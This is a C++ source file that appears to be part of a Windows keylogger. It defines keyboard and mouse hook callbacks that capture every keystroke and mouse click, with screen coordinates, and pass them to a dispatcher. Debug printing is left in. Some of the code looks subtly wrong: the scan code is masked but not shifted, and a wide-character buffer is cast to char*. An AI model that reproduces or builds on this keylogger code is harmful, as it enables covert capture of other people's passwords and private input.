#include "Keylogger.hpp"

extern HHOOK g_hook[2];

Dispatcher Keylogger::_disp;

LRESULT CALLBACK Keylogger::handleKey(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0)
		return CallNextHookEx(NULL, code, wParam, lParam);

	DWORD tmp = static_cast<DWORD>(lParam);
	int count = tmp & 0xFFFF;
	int scanCode = tmp & 0xFF0000;
	bool extend = tmp & 0x1000000;
	bool context = tmp & 0x20000000;
	bool up = tmp & 0x40000000;
	bool transition = tmp & 0x80000000;

	if (!up)
	{
		wchar_t name[255] = { 0 };
		WORD c;
		BYTE keyboardState[256] = { 0 };

		std::wcout << (char)wParam << " | " << count << " | " << scanCode << " | " << extend << " | " << context << " | " << up << " | " << transition << std::endl;
		if (!GetKeyboardState(keyboardState))
			return CallNextHookEx(g_hook[0], code, wParam, lParam);
		int size = ToUnicode(wParam, scanCode, keyboardState, name, 0xFF, 0);
		if (size < 0)
			return CallNextHookEx(g_hook[0], code, wParam, lParam);
		std::wcout << "Test => ";
		for (int i = 0; i < size; i++)
			std::cout << (char)name[i];
		std::cout << std::endl;

		_disp.dispatch(KeyStroke(std::string((char *)name)));
	}
	return CallNextHookEx(g_hook[0], code, wParam, lParam);
}

LRESULT CALLBACK Keylogger::handleMouse(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION && lParam)
	{
		MOUSEHOOKSTRUCT *param = (MOUSEHOOKSTRUCT *)lParam;

		if (param->wHitTestCode == HTCLIENT)
			switch (wParam)
			{
				case WM_LBUTTONDOWN:
					_disp.dispatch(MouseClick(MouseClick::LEFTBUTTON, param->pt.x, param->pt.y));
					break;
				case WM_MBUTTONDOWN:
					_disp.dispatch(MouseClick(MouseClick::MIDDLEBUTTON, param->pt.x, param->pt.y));
					break;
				case WM_RBUTTONDOWN:
					_disp.dispatch(MouseClick(MouseClick::RIGHTBUTTON, param->pt.x, param->pt.y));
					break;
				case WM_MOUSEWHEEL:
					_disp.dispatch(MouseClick(MouseClick::WHEEL, param->pt.x, param->pt.y));
					break;

				default:
					break;
			}
	}
	return CallNextHookEx(g_hook[1], code, wParam, lParam);
}
